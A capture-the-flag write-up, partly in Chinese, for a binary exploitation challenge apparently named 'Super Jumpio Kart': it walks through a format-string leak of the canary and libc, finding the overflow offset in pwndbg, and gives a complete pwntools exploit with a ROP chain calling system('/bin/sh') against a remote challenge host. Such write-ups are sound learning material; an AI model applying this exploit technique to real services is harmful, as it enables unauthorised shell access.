# 1.0 Challenge
1. leak canary
2. how to find BO offset
3. send payload canary offset
# 2.0 Analysis

this is a simple challenge actually
flow of game is 
option 4 have format string issue
leak libc and canary 
then answer right or left get a bigger buffer
then send payload here
# 3.0 Solution

## 3.1 leak canary
this is a good script to detect
```python
from pwn import*
context.log_level='debug'
# context.arch='amd64'
context.os = "linux"

fname = "./super_jumpio_kart_patched"


def fuzz():
  for i in range (100):
    context.log_level = 'critical'
    
    r = process(fname)
    r.sendlineafter('> ', '4')
    r.sendlineafter(': ', f'%{i}$p')
    r.recvuntil('with: ')
    leak = r.recvline().strip().decode()
    if leak.startswith('0x7'):
      print(f'[{i}] Possible LIBC  : {leak}')
    elif leak.startswith('0x5'):
      print(f'[{i}] Possible PIE   : {leak}')
    elif leak.endswith('00'):
      print(f'[{i}] Possible Canary: {leak}')
    r.close()
fuzz()
```

## 3.2 find BO offset
after everything settle, GDB ctrl c on the input 
```
[+] Nice!                                                           
[!] Warning! LEFT turn ahead: L
[+] Nice!
[!] You are second! Do you want to use your Power Up?? (y/n)
> y
[+] BOOM! You finished 1st!!!
[*] Please tell us a few things about your victory:          
```
disass and break at read
```bash
st*)@plt>                                                                                               
   0x000055555555588b <+626>:   mov    rax,QWORD PTR [rbp-0x38]
   0x000055555555588f <+630>:   mov    edx,0x88
   0x0000555555555894 <+635>:   mov    rsi,rax
   0x0000555555555897 <+638>:   mov    edi,0x0
   0x000055555555589c <+643>:   call   0x5555555551b0 <read@plt>
   0x00005555555558a1 <+648>:   mov    rsp,rbx
   0x00005555555558a4 <+651>:   nop
   0x00005555555558a5 <+652>:   mov    rax,QWORD PTR [rbp-0x18]
   0x00005555555558a9 <+656>:   sub    rax,QWORD PTR fs:0x28
   0x00005555555558b2 <+665>:   je     0x5555555558b9 <race()+672>
   0x00005555555558b4 <+667>:   call   0x555555555170 <__stack_chk_fail@plt>
   0x00005555555558b9 <+672>:   mov    rbx,QWORD PTR [rbp-0x8]
   0x00005555555558bd <+676>:   leave
   0x00005555555558be <+677>:   ret
End of assembler dump.
pwndbg> b *race+665
Breakpoint 1 at 0x5555555558b2
pwndbg> 
```
then continue and input cincai "aaaa" check stack 30
```bash
pwndbg> stack 30
00:0000│ rbx rsp 0x7fffffffdb00 ◂— 0x10
01:0008│-048     0x7fffffffdb08 ◂— 7
02:0010│-040     0x7fffffffdb10 ◂— 0xf
03:0018│-038     0x7fffffffdb18 —▸ 0x7fffffffdaf0 ◂— 0xa61616161 /* 'aaaa\n' */
04:0020│-030     0x7fffffffdb20 —▸ 0x555555557651 ◂— 0x474952005446454c /* 'LEFT' */
05:0028│-028     0x7fffffffdb28 —▸ 0x555555557656 ◂— 0x5448474952 /* 'RIGHT' */
06:0030│-020     0x7fffffffdb30 ◂— 0xa790a4c0a6568 /* 'he\nL\ny\n' */
07:0038│-018     0x7fffffffdb38 ◂— 0x873a74093338c900
08:0040│-010     0x7fffffffdb40 ◂— 0x555500000000
09:0048│-008     0x7fffffffdb48 —▸ 0x7fffffffdcb8 —▸ 0x7fffffffe060 ◂— '/home/kali/Desktop/CTF/smashctf/super_jumpio_kart_patched'
0a:0050│ rbp     0x7fffffffdb50 —▸ 0x7fffffffdb70 —▸ 0x7fffffffdb90 —▸ 0x7fffffffdc30 —▸ 0x7fffffffdc90 ◂— ...
0b:0058│+008     0x7fffffffdb58 —▸ 0x5555555559d5 (power_up()+278) ◂— nop 
0c:0060│+010     0x7fffffffdb60 —▸ 0x7ffff7a03b20 (main_arena+96) —▸ 0x55555556d6b0 ◂— 0
0d:0068│+018     0x7fffffffdb68 ◂— 0x873a74093338c900
0e:0070│+020     0x7fffffffdb70 —▸ 0x7fffffffdb90 —▸ 0x7fffffffdc30 —▸ 0x7fffffffdc90 ◂— 0
0f:0078│+028     0x7fffffffdb78 —▸ 0x555555555a11 (main+37) ◂— mov eax, 0
10:0080│+030     0x7fffffffdb80 —▸ 0x7fffffffdbb0 ◂— 0x1ffffdbd0
11:0088│+038     0x7fffffffdb88 ◂— 0x873a74093338c900
12:0090│+040     0x7fffffffdb90 —▸ 0x7fffffffdc30 —▸ 0x7fffffffdc90 ◂— 0
13:0098│+048     0x7fffffffdb98 —▸ 0x7ffff782a1ca (__libc_start_call_main+122) ◂— mov edi, eax

```

can see the aaaa at 0x7fffffffdaf0, the canary at 0x7fffffffdb38
0x7fffffffdb38 - 0x7fffffffdaf0 = 0x48
so offset is 0x48 

## 3.3 find canary to return offset 

平时我们是 canary to ret 8 个 cincai value 罢了
```
以前的sample
   0x00000000004014ee <+571>:   call   0x401050 <__stack_chk_fail@plt>
   0x00000000004014f3 <+576>:   leave
   0x00000000004014f4 <+577>:   xor    eax,eax
   0x00000000004014f6 <+579>:   xor    edx,edx
   0x00000000004014f8 <+581>:   xor    ecx,ecx
   0x00000000004014fa <+583>:   xor    esi,esi
   0x00000000004014fc <+585>:   xor    edi,edi
   0x00000000004014fe <+587>:   ret
```
现在是 8 x 3 = 24 个 cincai
```
现在的 challenge
   0x00000000004014ee <+571>:   call   0x401050 <__stack_chk_fail@plt>
   0x00000000004014ee <+xxx>:   mov rbx QWORDPTR [rbp-0x8]
   0x00000000004014f3 <+xxx>:   leave
   0x00000000004014fe <+xxx>:   ret
```
ermmm 其实我没有很懂 区别是什么？
大概率是 `mov rbx QWORDPTR [rbp-0x8]` ？
以前的pattern 是
```
[buf (8 bytes)]      <- 假设你能覆盖这里
[canary (8 bytes)]   <- stack canary
[saved rbp (8 bytes)]
[ret address (8 bytes)] <-- 目标：我们要控制的
```
现在是 应该是因为多了 return parameter 之类？？？
```
[buf]
[canary]
[saved rbx]       <- NEW!!
[saved rbp]
[ret]
```

# 4.0 FLAG 
after ctf end 
# 5.0 FINAL SCRIPT 
```python
# -*- coding: utf-8 -*-
from pwn import*
# context.log_level='debug'
context.arch='amd64'
context.os = "linux"

pc = "./super_jumpio_kart_patched"

libc  = ELF('./libc.so.6', checksec=False)
ld = ELF("./ld-2.39.so")
exe = context.binary = ELF(pc)



scripts = """
"""
 
if __name__ == '__main__':
    local = sys.argv[1]
    if local == 'l':
        r= process(pc)
        elf = ELF(pc)
    else:
        r=remote("34.45.81.67",16006)
        elf = ELF(pc)
 
# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)

s = lambda *a, **k: r.send(*a, **k)
sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
rl = lambda: r.recvline()
ru = lambda s : r.recvuntil(s, drop=True)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bhex = lambda b: int(b.decode(), 16)
ru7f = lambda: r.recvuntil(b'\x7f')
dbg = lambda: gdb.attach(r)
dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)

# leak 
# 0x7ffff7800000 -> libc base
# 0x7ffff7ffd000 -> code 
sla("> ","4")
sla(": ","%1$p.%9$p")
ru(": ")
leak = ru("\n").decode().strip()

parts = leak.split(".")

leak_stack = int(parts[0], 16)
canary = int(parts[1], 16)

log.success(f"leak_stack = {hex(leak_stack)}")
log.success(f"canary     = {hex(canary)}")

# 0x87fda40
offset = leak_stack - 0x7ffff7800000
print(f"offset to base: {hex(offset)}")


libc.address=leak_stack-offset
logbase()

# pass the game
# [!] Warning! RIGHT turn ahead: R                                                                        
for i in range(7):
    ru("[!] Warning! ")
    direction = rc(5)
    if b'RIGHT' in direction:
        s("R")
    else:
        s("L")

sla("> ","y")
# ROP
# rop = ROP(libc, base=libc.address)
# ret = rop.find_gadget(['ret'])[0]
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# bin_sh = next(libc.search(b'/bin/sh'))
# system = libc.sym['system']
pop_rdi = libc.address + 0x000000000010f75b
system = libc.address + 0x000000000058740
bin_sh = libc.address + 0x1cb42f
ret = libc.address + 0x000000000002882f
log.success(f"ret     = {hex(ret)}")
log.success(f"pop_rdi     = {hex(pop_rdi)}")
log.success(f"bin_sh     = {hex(bin_sh)}")
log.success(f"system     = {hex(system)}")

# dbg()
offset = 0x48
payload = b'a' * offset 
payload += p64(canary)
payload += b'b' * 24
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)


sla("your victory: ",payload)

ti()
```

# 6.0 REFERENCE
https://github.com/hackthebox/stack-smash-2025/blob/master/Super%20Jumpio%20Kart/htb/solver.py